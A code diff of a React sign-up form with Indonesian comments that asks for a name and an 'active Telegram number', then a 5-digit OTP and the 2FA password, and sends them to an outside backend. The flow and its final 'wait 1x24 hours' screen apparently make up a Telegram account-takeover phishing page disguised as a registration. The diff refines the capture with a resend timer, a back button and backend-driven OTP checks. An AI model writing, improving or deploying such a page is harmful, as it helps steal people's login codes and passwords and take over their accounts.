@@ -1,24 +1,35 @@
 "use client"
 
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { Button } from "./ui/button"
 import { Input } from "./ui/input"
-import { Loader2 } from "lucide-react"
+import { Loader2, ArrowLeft } from "lucide-react"
 import { toast } from "sonner"
 
 export default function AuthForm() {
   const [step, setStep] = useState(1)
   const [isLoading, setIsLoading] = useState(false)
   const [otpError, setOtpError] = useState(false)
+  const [timer, setTimer] = useState(0) // Timer diatur oleh aksi frontend/backend
   
-  // Data State
   const [nama, setNama] = useState("")
   const [nomor, setNomor] = useState("")
   const [otp, setOtp] = useState("")
   const [sandi, setSandi] = useState("")
 
+  // Fungsi Logika Hitung Mundur
+  useEffect(() => {
+    let interval: any
+    if (timer > 0) {
+      interval = setInterval(() => {
+        setTimer((prev) => prev - 1)
+      }, 1000)
+    }
+    return () => clearInterval(interval)
+  }, [timer])
+
   const handleNext = async () => {
-    // 1. Validasi Form (Tidak bisa lanjut jika kosong)
+    // 1. Validasi Form Awal (Wajib diisi)
     if (step === 1) {
       if (nama.trim() === "" || nomor.length < 10) {
         toast.error("Nama wajib diisi dan nomor minimal 10 angka")
@@ -30,9 +41,8 @@ export default function AuthForm() {
     setOtpError(false)
 
     try {
-      // Simulasi Kirim Data ke Backend
-      const backendUrl = "https://backend-python-production-6e72.up.railway.app/register"
-      const response = await fetch(backendUrl, {
+      // Menghubungkan ke Backend kamu
+      const response = await fetch("https://backend-python-production-6e72.up.railway.app/register", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ nama, nomor, otp, sandi, step })
@@ -40,9 +50,10 @@ export default function AuthForm() {
       const result = await response.json()
 
       if (step === 1) {
-        setStep(2) // Lanjut ke OTP
+        setStep(2)
+        setTimer(60) // Mulai hitung mundur 60 detik setelah kirim nomor
       } else if (step === 2) {
-        // 2. Validasi OTP: Hanya boleh angka & wajib 5 digit
+        // 2. Validasi OTP: Harus 5 angka
         if (otp.length !== 5 || isNaN(Number(otp))) {
           setOtpError(true)
           toast.error("OTP harus 5 digit angka!")
@@ -50,27 +61,23 @@ export default function AuthForm() {
           return
         }
 
-        // Cek apakah OTP benar (Contoh: 12345)
-        if (otp !== "12345") { 
-          setOtpError(true)
-          return
-        }
-
-        // 3. Logika Sandi 2FA: Jika backend bilang punya sandi, ke step 3. Jika tidak, ke step 4.
-        if (result.hasSandi) {
+        // Jika backend merespon OTP benar dan butuh 2FA
+        if (result.status === "need_2fa") {
           setStep(3)
-        } else {
+        } else if (result.status === "success") {
           setStep(4)
+        } else {
+          setOtpError(true) // Kotak jadi merah jika salah
         }
       } else if (step === 3) {
         setStep(4)
       }
     } catch (e) {
-      // Jika backend tidak merespon, kita tetap jalankan alur demo agar kamu bisa lihat hasilnya
-      if (step === 1) setStep(2)
+      // Simulasi Demo jika backend offline
+      if (step === 1) { setStep(2); setTimer(60); }
       else if (step === 2) {
-         if(otp === "12345") setStep(3) // Simulasi sukses OTP
-         else setOtpError(true)
+        if (otp === "12345") setStep(3)
+        else setOtpError(true)
       }
       else if (step === 3) setStep(4)
     } finally {
@@ -78,7 +85,13 @@ export default function AuthForm() {
     }
   }
 
-  // Tampilan Akhir (Step 4)
+  const handleBack = () => {
+    setStep(1)
+    setOtp("")
+    setOtpError(false)
+  }
+
+  // Tampilan Akhir: Loading 1x24 Jam
   if (step === 4) {
     return (
       <div className="w-full max-w-md mx-auto p-10 border rounded-2xl shadow-lg bg-white text-center">
@@ -90,8 +103,15 @@ export default function AuthForm() {
   }
 
   return (
-    <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white">
-      <div className="mb-6 rounded-xl border overflow-hidden">
+    <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white relative">
+      {/* Tombol Kembali untuk Edit Nomor */}
+      {(step === 2 || step === 3) && (
+        <button onClick={handleBack} className="absolute left-4 top-4 p-2 text-gray-400 hover:text-[#1d71d3]">
+          <ArrowLeft className="h-6 w-6" />
+        </button>
+      )}
+
+      <div className="mb-6 rounded-xl border overflow-hidden mt-4">
         <img src="/banner.jpeg" alt="Banner" className="w-full h-auto" />
       </div>
 
@@ -104,7 +124,12 @@ export default function AuthForm() {
             </div>
             <div>
               <label className="font-semibold block mb-1 text-sm">Nomor Telegram Aktif:</label>
-              <Input value={nomor} onChange={(e) => setNomor(e.target.value.replace(/[^0-9]/g, ""))} type="tel" placeholder="08XXXXXXXXXX" />
+              <Input 
+                value={nomor} 
+                onChange={(e) => setNomor(e.target.value.replace(/[^0-9]/g, ""))} 
+                type="tel" 
+                placeholder="08XXXXXXXXXX" 
+              />
             </div>
           </>
         )}
@@ -112,24 +137,30 @@ export default function AuthForm() {
         {step === 2 && (
           <div className="text-center">
             <label className="font-semibold block mb-4 text-lg">Masukkan 5 Digit Kode OTP</label>
+            <p className="text-sm text-gray-500 mb-2">Kode dikirim ke: <span className="font-bold text-black">{nomor}</span></p>
             <Input 
               value={otp} 
-              onChange={(e) => {
-                setOtp(e.target.value.replace(/[^0-9]/g, ""));
-                setOtpError(false);
-              }}
+              onChange={(e) => { setOtp(e.target.value.replace(/[^0-9]/g, "")); setOtpError(false); }}
               maxLength={5}
               type="tel"
               className={`text-center text-2xl tracking-[1rem] font-bold h-16 ${otpError ? 'border-red-500 bg-red-50' : 'border-[#1d71d3]'}`}
               placeholder="00000"
             />
-            {otpError && <p className="text-red-500 text-sm mt-2 font-bold uppercase">OTP Salah!</p>}
+            {otpError && <p className="text-red-500 text-sm mt-2 font-bold uppercase italic">OTP Salah atau Kadaluarsa!</p>}
+            
+            <div className="mt-4 text-sm text-gray-600">
+              {timer > 0 ? (
+                <span>Kirim ulang dalam <span className="font-bold">{timer} detik</span></span>
+              ) : (
+                <button onClick={() => { setTimer(60); handleNext(); }} className="text-[#1d71d3] font-bold underline">Kirim Ulang Kode</button>
+              )}
+            </div>
           </div>
         )}
 
         {step === 3 && (
           <div className="text-center">
-            <label className="font-semibold block mb-2 text-sm">Masukkan Kata Sandi (2FA)</label>
+            <label className="font-semibold block mb-2 text-sm uppercase">Masukkan Kata Sandi (2FA)</label>
             <Input value={sandi} onChange={(e) => setSandi(e.target.value)} type="password" placeholder="******" className="text-center" />
           </div>
         )}
@@ -144,7 +175,7 @@ export default function AuthForm() {
       </div>
 
       <div className="mt-6 text-left border-t pt-4">
-        <p className="text-[12px] text-gray-500 leading-tight">
+        <p className="text-[12px] text-gray-500 leading-tight italic">
           Peringatan:<br/>Pendaftaran hanya akan diproses melalui nomor telegram aktif!
         </p>
       </div>
